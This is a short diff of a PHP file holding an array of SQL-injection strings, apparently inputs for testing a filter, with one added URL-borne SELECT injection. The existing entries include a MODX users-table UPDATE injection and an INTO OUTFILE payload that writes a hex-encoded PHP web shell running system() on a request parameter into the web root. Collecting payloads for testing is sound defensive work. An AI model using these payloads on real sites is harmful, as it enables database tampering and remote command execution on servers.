@@ -17,6 +17,7 @@ $arr[]="-1'; UPDATE modx_users u LEFT OUTER JOIN modx_user_attributes a ON u.id=
 $arr[]="-1' union select 0x3C3F7068702073797374656D28245F4745545B635D293B3F3E,'' into outfile '/home/abs/path/www/set.php";
 $arr[]="\n";
 $arr[]="0x4841434B454440676D61696C2E636F6D";
+$arr[]="http://php.net/manual/ru/filter.filters.sanitize.php?a=aa&b=bbb'+SELECT";
 
 if(isset($_REQUEST['q']) && !empty($_REQUEST['q'])){
     $arr=array(
